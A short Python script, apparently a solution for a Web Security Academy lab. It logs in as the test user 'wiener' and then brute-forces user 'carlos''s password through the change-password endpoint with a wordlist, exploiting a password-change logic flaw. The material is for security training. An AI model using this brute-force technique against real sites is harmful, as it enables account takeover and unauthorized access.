import requests

s = requests.Session()
url = "https://0ada003f0334daa081d7a7b000530029.web-security-academy.net"
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

with open('wordlist_pass.txt', 'r') as arquivo_pass:
    list_pass = arquivo_pass.read().splitlines()
    
for i in range(len(list_pass)):

    data = {
        "username": "wiener",
        "password": "peter", 
    }
    response = s.post(f"{url}/login", headers=headers, data=data)
    if "Your username is: wiener" in response.text:
        print("wiener logado!")
    else:
        print(response)
    
    data = {
        "username": "carlos",
        "current-password": list_pass[i], 
        "new-password-1": "abc", 
        "new-password-2": "abc"
    }
    response = s.post(f"{url}/my-account/change-password", headers=headers, data=data)

    if "Password changed successfully!" in response.text:
        print(f"carlos:{list_pass[i]}")
        break
    elif "Login" in response.text:
        print("login")